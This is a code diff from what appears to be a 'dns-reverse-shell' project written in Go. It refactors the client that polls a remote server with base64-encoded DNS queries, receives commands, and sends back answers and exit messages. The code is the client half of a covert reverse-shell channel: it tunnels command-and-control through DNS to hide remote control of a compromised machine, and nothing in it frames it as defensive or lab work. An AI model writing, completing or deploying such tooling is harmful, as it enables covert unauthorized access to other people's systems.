@@ -5,42 +5,32 @@ import (
 	"dns-reverse-shell/main/protocol/encoder"
 	"fmt"
 	"github.com/miekg/dns"
-	"os"
-)
-
-type messageType string
-
-const (
-	POLL   messageType = "poll"
-	ANSWER messageType = "answer"
-	EXIT   messageType = "exit"
 )
 
 type DNSClient struct {
-	address            string
-	client             *dns.Client
-	idleCounter        int
-	messageHandler     *protocol.MessageHandler
-	interactionHandler *interactionHandler
+	address        string
+	client         *dns.Client
+	idleCounter    int
+	messageHandler *protocol.MessageHandler
+	commandHandler protocol.CommandHandler
 }
 
 func NewDNSClient(address string) *DNSClient {
 	client := new(dns.Client)
 	client.Net = "tcp"
 	msgHandler := protocol.NewMessageHandler(encoder.NewBase64Encoder(), protocol.NewSimpleMessageSplitter())
-	intHandler := newInteractionHandler()
-	return &DNSClient{address: address, client: client, messageHandler: msgHandler, interactionHandler: intHandler}
+	clientCommandHandler := newClientCommandHandler()
+	return &DNSClient{address: address, client: client, messageHandler: msgHandler, commandHandler: clientCommandHandler}
 }
 
 func (d DNSClient) Start() {
-	for {
-		d.poll()
-		d.interactionHandler.sleep()
-	}
+	d.commandHandler.Poll(func() {
+		d.sendMessage("poll", "poll")
+	})
 }
 
-func (d DNSClient) sendMessage(commandType messageType, message string) {
-	msg := d.messageHandler.CreateQuestionMessage(string(commandType), message)
+func (d DNSClient) sendMessage(commandType string, message string) {
+	msg := d.messageHandler.CreateQuestionMessage(commandType, message)
 	in, _, err := d.client.Exchange(msg, d.address)
 	if err != nil {
 		fmt.Println(err)
@@ -55,18 +45,17 @@ func (d DNSClient) handleAnswer(answerMsg *dns.Msg) {
 		return
 	}
 	fmt.Println(msg)
-	d.interactionHandler.handleCommand(msg, d.exitCallback, d.answerCallback)
+	d.commandHandler.HandleCommand(msg, d.poll, d.answerCallback, d.exitCallback)
 }
 
 func (d DNSClient) poll() {
-	d.sendMessage(POLL, "poll")
+	d.sendMessage("poll", "poll")
 }
 
 func (d DNSClient) answerCallback(message string) {
-	d.sendMessage(ANSWER, message)
+	d.sendMessage("answer", message)
 }
 
 func (d DNSClient) exitCallback() {
-	d.sendMessage(EXIT, "exit")
-	os.Exit(0)
+	d.sendMessage("exit", "exit")
 }
